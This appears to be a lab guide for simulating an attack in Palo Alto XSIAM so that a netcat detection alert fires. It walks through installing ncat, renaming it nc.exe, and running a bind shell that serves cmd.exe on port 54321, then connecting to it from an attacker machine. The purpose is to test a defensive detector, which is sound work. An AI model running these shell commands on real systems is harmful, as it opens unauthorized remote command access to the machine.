# XSIAM Attack Simulation Instructions

Follow these steps to simulate the attack and ensure the alert is triggered correctly.

---

### 1. Verify Endpoint Connection
Ensure that:
- At least one endpoint is connected with the **XDR agent**. This endpoint will act as the victim machine.
- You have an attacker machine ready to establish a connection with the victim.

---

### 2. Download `ncat` (NMAP)
Download the `ncat` tool, part of the NMAP suite:
- **Windows:** Download `ncat` from [nmap.org](https://nmap.org/ncat/) and install it manually.
- **Linux:** It might already be preinstalled. If not, install it using your package manager (e.g., `apt`, `yum`, or `dnf`).

**Note:** Ensure `ncat` is installed on both the attacker and victim machines:
- The attacker machine will send data.
- The victim machine will listen for the connection.

---

### 3. Mandatory Configuration
Rename the `ncat` executable on the Windows machine to `nc.exe`:
```plaintext
Rename the file to: nc.exe
```
This step is required for the detector to function properly.  
**Failure to complete this step will prevent the alert from triggering.**

---

### 4. Start Listening on the Victim Machine
On the victim machine, start a listening port using the following command:
```bash
nc -n -v -l -p 54321 -e c:\Windows\System32\cmd.exe
```

---

### 5. Initiate the Connection from the Attacker Machine
On the Windows (attacker) machine, initiate a connection to the victim machine using the command below:
```cmd
nc <victim_ip> <listening_port>
```
Replace:
- `<victim_ip>` with the IP address of the victim machine.
- `<listening_port>` with the port configured earlier (e.g., `54321`).

---

### Example
- **Victim Command:**
  ```bash
  nc -n -v -l -p 54321 -e c:\Windows\System32\cmd.exe
  ```
- **Attacker Command:**
  ```cmd
  nc 192.168.1.100 54321
  ```

Now, your environment is ready for the attack simulation.
